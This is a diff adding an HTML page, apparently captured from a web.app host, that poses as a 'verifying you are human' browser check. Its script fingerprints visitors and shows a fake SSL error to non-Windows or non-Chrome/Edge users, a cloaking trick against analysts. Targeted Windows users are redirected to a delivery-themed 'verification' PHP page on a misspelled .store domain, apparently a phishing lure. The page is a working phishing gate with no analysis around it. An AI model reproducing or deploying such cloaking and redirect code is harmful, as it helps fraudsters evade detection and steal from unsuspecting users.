@@ -1,0 +1,109 @@
+<!-- url: https://delivery-6dd56.web.app/
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Checking</title>
+  <style>
+    body { font-family: Arial, sans-serif; }
+    #white-theme, #black-theme { display: none; }
+
+    /* Added infinite progress bar animation */
+    @keyframes progress-loading {
+      0% { width: 0%; opacity: 1; }
+      100% { width: 100%; opacity: 1; }
+    }
+
+    @media (prefers-color-scheme: light) {
+      #white-theme { display: block; }
+      body { background-color: white; color: black; }
+    }
+    @media (prefers-color-scheme: dark) {
+      #black-theme { display: block; }
+      body { background-color: black; color: white; }
+    }
+  </style>
+  <script>
+    function getBrowserInfo() {
+      const ua = navigator.userAgent;
+      const platform = navigator.platform;
+      const isWindows = platform.indexOf('Win') !== -1;
+      let browser = null;
+      let version = null;
+
+      // Detect Edge Chromium
+      let edgeMatch = ua.match(/Edg\/(\d+)/);
+      if (edgeMatch) {
+        browser = 'Edge';
+        version = parseInt(edgeMatch[1], 10);
+      } else {
+        // Detect Chrome (exclude Edge and Opera)
+        let chromeMatch = ua.match(/Chrome\/(\d+)/);
+        if (chromeMatch && !ua.includes('Edg') && !ua.includes('OPR')) {
+          browser = 'Chrome';
+          version = parseInt(chromeMatch[1], 10);
+        }
+      }
+
+      return { isWindows, browser, version };
+    }
+
+    function checkAndRedirect() {
+      const { isWindows, browser, version } = getBrowserInfo();
+      const minVersion = 130; // Minimum allowed version
+      const redirectUrlIfNotAllowed = "https://google.com/unsupported-browser"; // Change this URL
+
+      if (!isWindows) {
+        redirectTo(redirectUrlIfNotAllowed);
+        return;
+      }
+
+      if (!browser || (browser !== 'Chrome' && browser !== 'Edge')) {
+        redirectTo(redirectUrlIfNotAllowed);
+        return;
+      }
+
+      if (version === null || version < minVersion) {
+        redirectTo(redirectUrlIfNotAllowed);
+        return;
+      }
+
+      // Allowed: redirect after delay
+      setTimeout(() => {
+        window.location.href = "https://delivery-service.x8495-buisnesswork.store/s306verification.php";
+      }, 2000);
+    }
+
+    function redirectTo(url) {
+      // Optionally show a message before redirecting
+      document.body.innerHTML = `
+        <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:Arial,sans-serif;color:#c00;">
+          <h1>ERR_SSL_PROTOCOL_ERROR.</h1>
+          <p>Your browser can’t provide a secure connection.</p>
+        </div>
+      `;
+      // Redirect after short delay
+      setTimeout(() => {
+        window.location.href = url;
+      }, 5000);
+    }
+
+    window.onload = checkAndRedirect;
+  </script>
+</head>
+<body>
+  <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;">
+    <p id="browserMessage">Checking your browser...</p>
+    <div style="width: 300px; height: 20px; background: #ddd; border-radius: 10px; overflow: hidden;">
+      <div id="progress" style="
+           height: 100%; 
+           background: rgb(76, 175, 80);
+           width: 0%;
+           animation: progress-loading 1.5s infinite ease-out;
+      "></div>
+    </div>
+    <p>Verifying you are human. This may take a few seconds.</p>
+  </div>
+</body>
+</html>
